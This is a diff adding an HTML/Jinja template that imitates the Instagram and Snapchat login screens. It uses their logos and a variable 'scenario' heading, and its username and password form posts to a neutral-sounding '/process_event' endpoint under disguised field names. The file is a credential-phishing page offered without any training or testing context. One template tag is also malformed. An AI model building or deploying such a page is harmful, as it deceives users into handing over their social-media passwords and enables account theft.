@@ -1,0 +1,28 @@
+
+<!DOCTYPE html>
+<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'>
+<style>
+    body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; transition: 0.5s;
+    {% if platform == 'snap' %} background: #FFFC00; {% else %} background: #fafafa; {% endif %} }
+    .box { background: white; padding: 40px; text-align: center; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 300px; }
+    input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 6px; box-sizing: border-box; }
+    button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+    .snap button { background: #000; }
+    img { width: 100px; margin-bottom: 15px; }
+</style></head>
+<body class="{{ 'snap' if platform == 'snap' else 'insta' }}">
+    <div class="box">
+        {% if platform == 'snap' %}
+            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png">
+            <h2>{{ scenario }}</h2>
+        {% else %}
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511100755.png">
+            <h2>{{ scenario }}</h2>
+        {% endif }
+        <form action="/process_event?platform={{platform}}" method="post">
+            <input type="text" name="identity_id" placeholder="Username" required>
+            <input type="password" name="auth_token" placeholder="Password" required>
+            <button type="submit">Continue</button>
+        </form>
+    </div>
+</body></html>
